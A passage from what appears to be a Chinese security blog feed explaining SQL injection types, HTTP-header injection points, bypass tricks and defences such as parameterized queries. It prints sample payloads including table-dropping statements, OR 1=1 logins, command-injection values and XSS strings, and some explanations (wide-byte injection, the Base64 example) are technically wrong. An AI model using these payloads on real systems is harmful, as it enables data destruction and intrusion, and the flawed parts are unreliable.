避免了用户输入的特殊SQL字符会破坏SQL语句的语法</p><p>• 数据库能有效识别和清理恶意输入</p><p>• 用户输入在SQL语句中被视为安全的参数,而非语法的一部分</p><p>参数化查询的SQL语句示例:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String query <span class="operator">=</span> &quot;select * from users where name = ?&quot;;</span><br><span class="line">PreparedStatement stmt <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userInput);</span><br><span class="line">ResultSet rs <span class="operator">=</span> stmt.executeQuery();</span><br></pre></td></tr></table></figure><p>这里使用?作为参数占位符,在执行SQL前使用setString()方法将用户输入绑定到参数1上。</p><p>而非直接在SQL语句中使用userInput:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String query <span class="operator">=</span> &quot;select * from users where name = &#x27;&quot;<span class="operator">+</span> userInput <span class="operator">+</span>&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>最后, PreparedStatement 在执行时会做效参数校验和清理。</p><p>总的来说,参数化查询将用户输入视为安全参数来处理,而非不安全的SQL语法。</p><p>这是一种安全编码最佳实践,能有效防范SQL注入攻击。</p><p>希望通过这个解释,能让你更好地了解参数化查询的工作原理以及其重要性。如有任何疑问,欢迎随时提问。</p><p>防范SQL注入需要从以下几方面做:</p><ol><li>应用层过滤 Cleansing and validation</li></ol><ul><li>对所有用户输入进行严格的过滤和验证</li><li>清除或替换SQL关键字,触发字符等</li><li>限制输入字段的长度和数据类型</li></ul><ol start="2"><li>安全编码 Secure coding</li></ol><ul><li>使用参数化查询(Prepared Statements)绑定参数</li><li>避免在SQL语句中直接使用用户输入</li><li>对所有输出进行适当的编码,避免XSS</li></ul><ol start="3"><li>减少错误信息 Reduce error details</li></ol><ul><li>不要将SQL错误详情暴露给用户</li><li>使用通用的错误码和提示</li><li>避免泄露数据库信息</li></ul><ol start="4"><li>限制功能 Disable unused features</li></ol><ul><li>禁用非必需的SQL函数和存储过程</li><li>移除不需要的数据库功能</li><li>审查测试所有用到的SQL API</li></ul><ol start="5"><li>及时修复漏洞 Patch vulnerabilities</li></ol><ul><li>监控应用程序和数据库以查找漏洞</li><li>及时修补已知的SQL注入和其他漏洞</li></ul><ol start="6"><li>限制访问 Restrict access</li></ol><ul><li>对不同的用户和应用分配不同的数据库权限</li><li>按需限制对数据库的访问和操作</li></ul><ol start="7"><li>采用共享 hosting 或数据库云服务</li></ol><ul><li>将应用程序和数据库分离部署</li><li>由服务提供商提供基础安全保障</li></ul><p>总的来说,有效防范SQL注入需要从多方面来实施:</p><p>从应用程序安全编码、输入验证开始,<br>结合数据库安全配置、权限管理等多个防线,<br>辅以及时更新补丁和监控,<br>采取多重防御来降低SQL注入的攻击面和影响。</p><p>希望这能为你总结SQL注入防范措施提供帮助!<br>如有需要,欢迎指出我遗漏的重要内容,共同完善。</p><p>每个SQL注入防御措施的实际案例如下:</p><p>1.应用层过滤</p><p>例:对用户名进行清理,仅允许字母数字下划线:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">username = re.sub(<span class="string">&#x27;[^a-zA-Z0-9_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, username)</span><br></pre></td></tr></table></figure><p>2.安全编码</p><p>例:使用Prepared Statements绑定参数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span></span><br><span class="line">cursor.execute(sql, (username,))</span><br></pre></td></tr></table></figure><p>3.减少错误信息 </p><p>例:捕获SQL错误但返回通用提示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line"><span class="keyword">except</span> pymysql.InternalError <span class="keyword">as</span> e:</span><br><span class="line">    logger.error(e)</span><br><span class="line">    flash(<span class="string">&quot;There was an error processing your request&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br></pre></td></tr></table></figure><p>4.限制功能</p><p>例:仅允许查询已有表,禁止使用<code>create/drop</code>语句</p><p>5.及时修复漏洞</p><p>例:发现SQL注入后立即上线补丁以修复:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/patch&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sql_injection_patch</span>():</span><br><span class="line">    <span class="comment"># patch code</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;SQL injection vulnerability patched&#x27;</span></span><br></pre></td></tr></table></figure><p>6.限制访问</p><p>例:根据用户分配只读或读写数据库权限</p><p>7.采用云数据库</p><p>例:将数据库迁移至AWS RDS,由 AWS 负责数据安全。</p><p>希望这些具体的实践示例可以帮你更好地理解如何实施各种SQL注入防御措施!</p><p>如果还有任何疑问或者需要更多细节,欢迎随时提问,我会尽量提供更多有用的参考。</p><p>SQL堆叠注入是SQL注入攻击的一种。</p><p>它的主要思想是:在一个SQL语句中注入多个SQL语句,当服务器执行这个SQL语句时,将会连续执行这多个SQL语句。</p><p>如下SQL语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>; <span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br></pre></td></tr></table></figure><p>它实际上是两个SQL语句:</p><ul><li><code>select * from users where id=&#39;1&#39; and name=&#39;test&#39;;</code></li><li><code>drop table users;</code></li></ul><p>当数据库执行这个SQL语句时,将会:</p><ol><li>执行第一个SQL语句,select查询users表</li><li>执行第二个SQL语句,删除users表</li></ol><p>攻击者通过这种方式,可以向正常的SQL查询语句中注入多条有恶意的SQL语句,一起让数据库执行。</p><p>这种堆叠注入要求数据库支持多条SQL语句的执行。</p><p>常用的堆叠注入方式有:</p><ul><li>使用<code>;</code> 分号 separating可执行语句</li><li>使用<code>&amp;&amp;</code> 逻辑和运算符</li></ul><p>如上例子所示,使用<code>;</code>分号实现堆叠。</p><p>而通过这种方式,攻击者可以得到以下效果:</p><ul><li>查询数据库中的数据</li><li>修改数据库表结构</li><li>删除数据库表</li><li>执行系统命令</li><li>等等</li></ul><p>总的来说,SQL堆叠注入是一种危险的SQL注入方式,需要防范。</p><p>希望能为您提供参考!如有更多疑问,欢迎随时和我交流。</p><p>SQL宽字节注入(Wide Byte Injection)是SQL注入攻击的一种。</p><p>宽字节注入利用的是数据库和Web应用程序不能正确处理多字节字符集的数据。</p><p>多字节字符集中,一个字符可能占用多个字节来表示,如中文字符就属于多字节字符集。</p><p>而Web应用和数据库常常只能处理ASCII单字节字符集,不能正确处理多字节字符。</p><p>这就为SQL宽字节注入提供了可能。</p><p>攻击者可以使用 multibyte characters即多字节字符来构造SQL注入攻击,包括:</p><ul><li>使用双字节(如中文)或多字节字符作为注释符,例如:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span>; <span class="comment">/* 这是注释</span></span><br></pre></td></tr></table></figure><ul><li>使用unicode编码替换常用SQL注释符和函数,比如:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span><span class="operator">%</span>u0023<span class="operator">%</span>u0020select<span class="operator">%</span>u0020<span class="operator">*</span><span class="operator">%</span>u0020from<span class="operator">%</span>u0020users <span class="comment">--&#x27;; </span></span><br></pre></td></tr></table></figure><p>上述语句使用%u0023代表<code>#</code>,%u0020代表空格来替换注释符<code>--</code>。</p><ul><li>使用宽字节字符替换单引号等特殊符号,来进行不受限制的注入攻击。</li></ul><p>总的来说,宽字节注入 exploits数据库和应用程序的多字节字符集处理不足,使用多字节字符来构造SQL注入。</p><p>防范措施主要有:</p><ul><li>始终转义&#x2F;过滤用户输入,避免直接嵌入SQL</li><li>使用参数化查询来避免SQL注入</li><li>严格验证用户输入,过滤特殊字符。</li></ul><p>希望能为您提供参考!如果仍然有其他疑问,欢迎随时和我交流。</p><p>cookie注入是一种Web应用安全漏洞。</p><p>它的原理是攻击者可以注入恶意代码到Cookie中,当Web应用读取Cookie时被执行。</p><p>Cookie注入主要利用的是:</p><ol><li>Web应用未对Cookie内容进行足够的过滤和验证</li><li>Cookie中的数据被Web应用直接嵌入到SQL语句中</li><li>Cookie中的数据被Web应用直接当作命令执行</li></ol><p>这些条件都可以让 Cookie 注入形成安全隐患。</p><p>具体攻击方式包括:</p><ul><li>SQL注入:将SQL语句注入到Cookie中,当Web应用读取Cookie的数据时,执行SQL操作</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: username=test&#x27;; drop table users;--</span><br></pre></td></tr></table></figure><ul><li>XSS攻击:将XSS脚本注入Cookie,执行XSS攻击</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>命令执行:将系统命令注入Cookie,当Web应用读取Cookie时执行命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ;id;`ls`</span><br></pre></td></tr></table></figure><p>综上,Cookie 注入就是攻击者通过对Cookie数据的利用,来执行SQL注入、XSS或命令执行等攻击。</p><p>主要防范方案是:</p><ul><li>对Cookie数据进行适当的过滤,只允许安全数据</li><li>不要直接嵌入Cookie数据到SQL语句或命令中执行</li><li>确保Cookie域设置合理,限制Cookie可访问的页面</li></ul><p>希望能为您提供参考!如仍然有其他疑问,欢迎随时和我交流。</p><p>XFF(X-Forwarded-For)头注入是网站安全漏洞之一。</p><p>XFF头用于记录请求者的IP地址。</p><p>当用户通过代理或负载均衡设备访问Web应用时,真实的客户端IP会记录在XFF头中。</p><p>XFF注入发生在:</p><ul><li><p>Web应用直接将XFF头中的IP地址,拼接在SQL查询语句或命令中执行。</p></li><li><p>Web应用未对XFF头中的IP地址做严格的验证。</p></li></ul><p>这就可能允许注入SQL命令或代码。</p><p>具体攻击方式包括:</p><ul><li>SQL注入:将包含SQL查询或命令的IP地址写在XFF头中,从而执行SQL操作。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1.1.1.1&#x27;; drop table users; --</span><br></pre></td></tr></table></figure><ul><li>命令执行:将IP地址写为命令,从而在Web应用读取XFF头时执行命令。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: ;id;whoami</span><br></pre></td></tr></table></figure><ul><li>XSS攻击:将包含XSS脚本的IP地址写在XFF头中,执行XSS。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>总的来说,XFF头注入的基本原理是:<br>攻击者在XFF头中写入特制的IP地址,包含SQL命令、系统命令或XSS脚本等,<br> 当Web应用读取XFF头直接使用其内容时被执行。</p><p>防范方案主要是:</p><ul><li>不要直接使用XFF头中的IP地址,需要做严格的验证和清洗</li><li>使用参数化查询,避免在SQL语句中直接使用头信息</li><li>过滤特殊字符,只允许安全的数据进入Web应用</li></ul><p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p><p>UA注入(User-Agent注入)是网站安全漏洞之一。</p><p>User-Agent头记录用户使用的浏览器及操作系统相关信息。</p><p>UA注入发生在:</p><ul><li><p>Web应用直接将User-Agent头中的信息,插入SQL查询语句或命令中执行。</p></li><li><p>Web应用未对User-Agent头信息做足够的验证。</p></li></ul><p>这就可能允许注入恶意代码。</p><p>具体攻击方式包括:</p><ul><li>SQL注入:在User-Agent头中写入SQL语句,从而执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;   </span><br><span class="line">rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6&#x27;; drop table users; --</span><br></pre></td></tr></table></figure><ul><li>命令执行:写入系统命令 注入User-Agent头,在Web应用读取时执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows; U; ;)`whoami`</span><br></pre></td></tr></table></figure><ul><li>XSS攻击:写入XSS脚本到User-Agent头中执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>综上,UA注入的基本原理是:</p><p>攻击者在User-Agent头中写入恶意代码,包含SQL语句、系统命令或XSS脚本等,<br>当Web应用读取User-Agent头直接使用其内容时被执行。</p><p>防范方法主要有:</p><ul><li>不要直接使用User-Agent头内容,需要严格验证和过滤特殊字符</li><li>使用参数化查询,避免在SQL语句中直接使用头信息</li><li>有效的输入过滤,只允许安全的数据进入Web应用</li></ul><p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p><p>Referer注入是网站安全漏洞之一。</p><p>Referer头记录了此次 HTTP 请求的最后一个网页访问资源。</p><p>Referer注入发生在:</p><ul><li><p>Web应用直接将Referer头中的URL,插入SQL查询语句或命令中执行。</p></li><li><p>Web应用未对Referer头做足够的验证。</p></li></ul><p>这就可能允许注入恶意代码。</p><p>具体攻击方式包括:</p><ul><li>SQL注入:在Referer头中写入包含SQL语句的链接,网页访问时被执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/login.php?username=test&#x27;; drop table users; -- </span><br></pre></td></tr></table></figure><ul><li>命令执行:写入包含系统命令的URL 注入Referer头,在Web应用读取时执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/`whoami`</span><br></pre></td></tr></table></figure><ul><li>XSS攻击:写入包含XSS脚本的URL,注入Referer头执行XSS。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://example.com/&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>综上,Referer注入的基本原理是:</p><p>攻击者在Referer头中写入恶意代码,包含SQL语句、系统命令或XSS脚本等,<br>当Web应用读取Referer头直接使用其内容时被执行。</p><p>防范方法主要有:</p><ul><li>不要直接使用Referer头内容,需要严格验证和过滤特殊字符</li><li>使用参数化查询,避免在SQL语句中直接使用头信息  </li><li>有效的输入过滤,只允许安全的数据进入Web应用</li></ul><p>希望能为您提供参考!如还有其他疑问,欢迎随时和我交流。</p><p>二次注入(Second-order injection)是一种Web应用安全漏洞。</p><p>区别于一次性注入,它需要两次或多次请求才能完成注入攻击。</p><p>主要利用的是:</p><ol><li><p>Web应用在第一次请求中过滤了用户输入的参数,但是记录了这些参数。</p></li><li><p>在第二次请求中使用了第一次请求记录的参数,但缺乏进一步过滤,导致注入攻击。</p></li></ol><p>典型攻击方式为:</p><ul><li>用户名和密码的验证:</li></ul><p>第一次请求时输入正常用户名和密码,Web应用将用户名记录到Session或Cookie中。</p><p>第二次请求时,Web应用从Session读取用户输入的用户名,而不再进行过滤,从而形成SQL注入漏洞。</p><ul><li>评论内容的保存:</li></ul><p>第一次请求时输入正常的评论内容。</p><p>第二次请求中,Web应用从数据库读取评论内容,而未对内容进行过滤,导致XSS攻击。</p><ul><li>购物车内容保存:</li></ul><p>网页将购物车中的商品列表保存到Session或数据库。</p><p>第二次请求时,Web应用读取Session或数据库的内容,将商品列表插入SQL语句中,形成SQL注入。</p><p>总的来说,二次注入利用的是:</p><ul><li><p>Web应用在第一时刻过滤了用户输入。</p></li><li><p>但在第二次读取用户输入时,又使用了不安全的方法(如直接拼接SQL语句),缺乏进一步过滤,从而产生安全风险。</p></li></ul><p>防范方式主要有:</p><ul><li>在每一次读取用户输入时,都要进行适当的过滤和转义。</li><li>使用参数化查询以避免SQL注入。</li><li>始终检验和过滤输出,以防止XSS攻击。</li></ul><p>希望可以为您提供参考!如还有其他疑问,欢迎随时和我交流。</p><p>Base64注入是一种利用Base64编码绕过输入过滤进行注入攻击的技巧。</p><p>通常情况下,用户输入的数据会被过滤特殊字符来防止SQL注入、XSS攻击等。</p><p>而Base64编码就可以用于绕过这种过滤。</p><p>Base64编码会将数据转换成ASCII字符组,看起来就像正常的数据。</p><p>具体做法是:</p><ol><li><p>将SQL语句或XSS脚本等代码经Base64编码;</p></li><li><p>把编码后的字符串作为参数提交;</p></li><li><p>Web应用在处理时会先将Base64字符串解码,再执行;</p></li><li><p>从而实现注入攻击。</p></li></ol><p>例如:</p><p>SQL语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; drop table users;--</span></span><br></pre></td></tr></table></figure><p>Base64编码后:</p><p>YCcgZHJvcCB0YWJsZSB1c2VyczstLQ&#x3D;&#x3D;</p><p>提交参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;username=YCcgZHJvcCB0YWJsZSB1c2VyczstLQ==</span><br></pre></td></tr></table></figure><p>Web应用处理时:</p><ol><li>先对username的值 YCcgZHJvcCB0YWJsZSB1c2VyczstLQ&#x3D;&#x3D; 进行Base64解码</li><li>得到’; drop table users;–</li><li>然后将其嵌入SQL语句中执行</li></ol><p>从而实现了SQL注入攻击。</p><p>综上,Base64注入利用Base64编码绕过过滤,达到执行注入攻击的目的。</p><p>防范方式主要是:</p><ul><li>对所有用户输入进行双重过滤,包括Base64解码后的内容再做过滤</li><li>避免直接使用用户输入,使用参数化查询等安全 METHOD</li></ul><p>希望可以为您提供参考!如还有其他疑问,欢迎随时和我交流。</p><h3 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h3><p>以下是SQL注入的四种常用绕过方法:</p><p>1.大小写绕过注入:利用SQL的大小写不敏感特性,将SQL关键字如select、from等改写为其他大小写绕过过滤。</p><p>2.双写绕过注入:将SQL关键字如select写为sselect、ffrom写为ffrom等双写绕过。</p><p>3.编码绕过注入:使用URL编码或其他编码方式对SQL关键字进行编码绕过过滤。如encodeURI()函数。</p><p>4.内联注释绕过注入:# 或– 注释符绕过。例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>#</span><br><span class="line"><span class="keyword">user</span>()# </span><br><span class="line"><span class="keyword">from</span> users <span class="comment">--</span></span><br></pre></td></tr></table></figure><p>使用注释进行SQL拼接绕过过滤。</p><h3 id="SQL注入有哪些危害？"><a href="#SQL注入有哪些危害？" class="headerlink" title="SQL注入有哪些危害？"></a>SQL注入有哪些危害？</h3><p>1.获取数据库数据</p><p>数据库中存放的用户的隐私信息的泄露，脱取数据库中的数据内容（脱库），可获取网站管理员帐号、密码悄无声息的进行对网站后台操作等。</p><p>2.网页篡改</p><p>通过操作数据库对特定网页进行篡改，严重影响正常业务进行与受害者信誉。</p><p>3.网页挂马</p><p>将恶意文件或者木马下载链接写入数据库，修改数据库字段值，进行挂马攻击。</p><p>4.篡改数据库数据</p><p>攻击数据库服务器，篡改或者添加普通用户或者管理员帐号。</p><p>5.获取服务器权限</p><p>列取目录、读取、写入shell文件获取webshell，远程控制服务器，安装后门，经由数据库服务器提供的操作系统支持，让攻击者得以修改或控制操作系统。</p><p>SQL注入是一种常见的网络安全漏洞，攻击者利用该漏洞在应用程序的SQL查询中插入恶意的SQL代码，从而执行未经授权的数据库操作。SQL注入的注入点类型可以根据注入发生的位置和方式进行分类。以下是一些常见的SQL注入的注入点类型分类：</p><ol><li><p>查询字符串注入（Query String Injection）：攻击者通过修改URL中的查询字符串参数，将恶意的SQL代码插入到应用程序的数据库查询中。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page?id=1; DROP TABLE users;</span><br></pre></td></tr></table></figure></li><li><p>表单注入（Form Injection）：攻击者通过修改应用程序的表单输入字段，将恶意的SQL代码插入到数据库查询中。这种注入点类型常见于登录表单、搜索表单等。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; -- </span><br></pre></td></tr></table></figure></li><li><p>HTTP头注入（HTTP Header Injection）：攻击者通过修改HTTP请求头部的一些字段值，将恶意的SQL代码插入到应用程序的数据库查询中。这种注入点类型通常发生在应用程序在处理用户提供的HTTP头部字段时缺乏充分的输入验证和过滤。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0\r\n\r\nSET @var = &#x27;evil code&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>Cookie注入（Cookie Injection）：攻击者通过修改HTTP请求中的Cookie值，将恶意的SQL代码插入到应用程序的数据库查询中。这种注入点类型常见于未对Cookie进行充分验证和过滤的情况下，将Cookie值直接用于数据库查询。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: username=&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span><br></pre></td></tr></table></figure></li><li><p>存储过程注入（Stored Procedure Injection）：攻击者通过修改应用程序调用数据库存储过程的参数，将恶意的SQL代码插入到存储过程中，从而执行未经授权的操作。</p></li></ol><p>这些是常见的SQL注入的注入点类型，但并不是 exhaustive list。重要的是了解这些类型，并采取适当的防御措施，如使用参数化查询、输入验证和过滤、最小权限原则等来防止SQL注入攻击。</p><h5 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h5><p>是一种SQL注入攻击技术。攻击者利用网站的输入字段(如搜索框、登录框等)输入特制的SQL语句,从而诱骗数据库执行恶意操作。</p><p>数字型SQL注入是通过将数字作为SQL注入条件插入到输入字段中实现的。例如:</p><ol><li>查询数据表中的某个特定记录:</li></ol><p>URL 为:<a href="http://example.com/query?id=1">http://example.com/query?id=1</a></p><p>注入为:<a href="http://example.com/query?id=1">http://example.com/query?id=1</a> or 1&#x3D;1</p><p>逼真的注入将具体条件替换为 1&#x3D;1 ,导致返回所有记录。</p><ol start="2"><li>修改数据表中的记录:</li></ol><p>URL 为:<a href="http://example.com/update?id=1&name=John">http://example.com/update?id=1&amp;name=John</a></p><p>注入为:<a href="http://example.com/update?id=1">http://example.com/update?id=1</a>; update table set name&#x3D;’hacked’ –</p><p>附加的 SQL 语句会更新该表所有记录的 name 字段为 hacked。</p><p>3)删除数据表中的记录:</p><p>类似地,数字型SQL注入也可以用于删除数据表中的记录。</p><p>以上都是数字型SQL注入的基本方式。透过输入精心编写的数字型SQL语句,攻击者就可以获取敏感数据、损坏数据等。</p><p>数字型SQL注入主要利用普遍存在的SQL语句 flawed input进行,因此需要对网站代码及数据库进行安全配置来防范这类攻击。</p><h5 id="布尔型SQL注入"><a href="#布尔型SQL注入" class="headerlink" title="布尔型SQL注入"></a>布尔型SQL注入</h5><p>是一种SQL注入攻击方法。它通过插入特殊构造的SQL语句,观察数据库行为(返回TRUE或FALSE),来获取数据库信息。</p><p>这种注入的过程如下:</p><ol><li><p>攻击者首先构造一个能返回TRUE&#x2F;FALSE的SQL条件语句。</p></li><li><p>然后将这个语句插入表单输入框提交。</p></li><li><p>根据数据库返回的结果(页面异常&#x2F;正常),攻击者判断条件语句返回的结果是TRUE还是FALSE。</p></li><li><p>通过不断重复上述步骤,逐渐消解SQL语句,掌握数据库结构信息和数据内容。</p></li></ol><p>举个例子:</p><p>一个网站的登录表单如下:</p><p><code>&lt;form&gt;  Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt; Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</code></p></form><p>一般的登录请求为:</p><p><code>http://example.com/login.php?user=john&amp;pwd=12345</code></p><p>此时攻击者可以注入以下语句测试:</p><p><code>http://example.com/login.php?user=admin&#39; or 1=1 --&amp;pwd=12345</code></p><p>如果页面正常显示(可登录),则表示返回TRUE。<br>反之,如果显示异常(无法登录),则表示返回FALSE。</p><p>通过不断重复上述方式进行注入,逐步测试数据库的结构和数据内容,最终达到攻击目的。</p><p>总的来说,布尔型SQL注入通过返回TRUE或FALSE来探测数据库信息,隐蔽性强,难以防范,属于常见的SQL注入攻击方法之一。</p><h5 id="字符型SQL"><a href="#字符型SQL" class="headerlink" title="字符型SQL"></a>字符型SQL</h5><p>注入是一种SQL注入攻击方法。它通过插入包含特殊字符的SQL语句,来获取数据库信息。</p><p>这种注入的过程如下:</p><ol><li><p>攻击者构造包含特殊字符的SQL语句,如单引号’、转义符\等。</p></li><li><p>将这个语句插入表单输入框提交。</p></li><li><p>根据数据库返回的信息,攻击者解析结果,逐渐获取数据库数据。</p></li></ol><p>例如:</p><p>一个网站有一个用户注册表单,如下:</p><p>&#96;<form><br>Username: <input type="text" name="user"><br>Password: <input type="password" name="pwd"></p></form>`<p>正常的注册请求为:</p><p><code>http://example.com/register.php?user=john&amp;pwd=12345</code></p><p>此时攻击者可以注入:</p><p><code>http://example.com/register.php?user=john&#39; 或者 user=john&quot;</code>   </p><p>如果数据库返回的信息包含特殊字符,则表示注入成功。</p><p>通过不断重复上述过程,修改注入payload并观察返回结果,攻击者最终能获得数据库中表名、字段名、记录数等敏感信息。</p><p>总的来说,字符型SQL注入通过注入特殊字符并观察数据库返回结果,来获取数据库信息。它比布尔型SQL注入更直接,能迅速掌握数据库结构,因此也属于常见的SQL注入攻击方法。</p><p>防范字符型SQL注入主要通过对用户输入做合法性校验、添加转义字符、prepared statements等方法。</p><h5 id="搜索型SQL"><a href="#搜索型SQL" class="headerlink" title="搜索型SQL"></a>搜索型SQL</h5><p>注入是一种通过网站搜索功能来执行SQL注入攻击的方式。</p><p>这种注入的核心思路是:</p><ol><li><p>攻击者先构造包含SQL关键字或特殊字符的搜索词。</p></li><li><p>将这个搜索词输入搜索框,提交到网站后台。</p></li><li><p>如果搜索结果数量超出预期,表明注入成功。</p></li></ol><p>通过不断完善搜索词,观察结果变化,攻击者逐渐掌握数据库结构和内容。</p><p>举个例子:</p><p>一个网站有个搜索框,可以搜索文章标题。</p><p>正常搜索词为:</p><p><code>http://example.com/search.php?q=sql</code></p><p>此时攻击者可以搜索: </p><p><code>http://example.com/search.php?q=sql&#39; or 1=1 --</code></p><p>如果搜索结果显示所有文章,则表明注入成功。</p><p>攻击者还可以继续搜索:</p><p><code>http://example.com/search.php?q=sql&#39; union select table_name from tables--</code></p><p>如果返回一个’表名’,则说明成功获取到一个表名。</p><p>通过不断完善这种搜索词,可能获得所有表名、字段名乃至数据记录。</p><p>总的来说,搜索型SQL注入通过网站搜索功能作为注入载体,通过构造特殊搜索词,执行SQL语句来获取数据库信息。它的易用性高,隐蔽性好,属于常见的SQL注入方式之一。</p><p>防范搜索型SQL注入的关键在于:</p><ol><li>对用户搜索词进行严格过滤,限定只允许合法字符</li><li>对搜索结果数量做限制,超出范围则标识可能存在注入</li><li>使用 prepared statements 等技术隔离SQL命令和用户输入</li></ol>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过</title>
      <link href="/2023/11/30/3.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
      <url>/2023/11/30/3.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
      
